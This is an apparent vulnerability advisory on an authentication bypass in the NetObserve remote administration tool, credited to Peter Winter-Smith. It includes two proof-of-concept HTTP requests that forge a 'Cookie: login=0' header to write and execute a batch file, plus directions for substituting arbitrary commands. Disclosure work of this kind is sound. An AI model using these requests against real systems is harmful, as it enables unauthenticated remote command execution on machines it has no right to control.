- Vendor's Description


2. Bug Information

(a). Security Bypass

NetObserve is extremely persistant when trying to ensure that any remote
user issuing commands to the server is properly authenticated. It seems
that even if the remote administrator closes his or her browser they are
required to login again before they can gain control of the remote system.

Once a legitimate session with an administrator has been established, the
browser confirms that the commands which the remote user is issuing are
allowed to be performed on the remote system by sending a special HTTP
header to the NetObserve server.

The only problem with this is the fact that any remote user can attach the
special header directly to their own specially crafted request, and
NetObserve blindly believes that a session with an administrator was
already in progress.

The special header in question is nothing more than 'Cookie: login=0'!


3. Proof of Concept Code

The following two HTTP requests will execute commands via the windows
command interpreter on the remote system:

REQUEST #1:

--------------------------------------------------------------------------
POST /sendeditfile HTTP/1.1
Accept: */*
Referer: http://127.0.0.1/editfile=?C:\WINDOWS\win.bat?
Content-Type: application/x-www-form-urlencoded
Host: AnyHostWillDo
Content-Length: 25
Cookie: login=0

newfiledata=cmd+%2Fc+calc
--------------------------------------------------------------------------

REQUEST #2:

--------------------------------------------------------------------------
GET /runfile=?C:\windows\win.bat? HTTP/1.1
Accept: */*
Host: AnyHostWillDo
Cookie: login=0


--------------------------------------------------------------------------

To change the commands to be run, just alter the 'Content-Length' of the
first request to be the length of the line of commands, including the
string 'newfiledata='.
Then alter the data being posted under 'newfiledata', remembering to
replace spaces with '+' and encode any common HTTP characters, like '/'
as hexadecimal values, '%2F' in this instance.

These specific requests sent unaltered will execute the windows
calculator.


4. Patches - Workarounds

No fixes are available at the time of writing. It it suggested that you
use a different, more secure remote administration software package until
a patch is released.

    The discovery, analysis and exploitation of this flaw is a result of
research carried out by Peter Winter-Smith. I would ask that you do not
regard any of the analysis to be 'set in stone', and that if investigating
this flaw you back trace the steps detailed earlier for yourself.
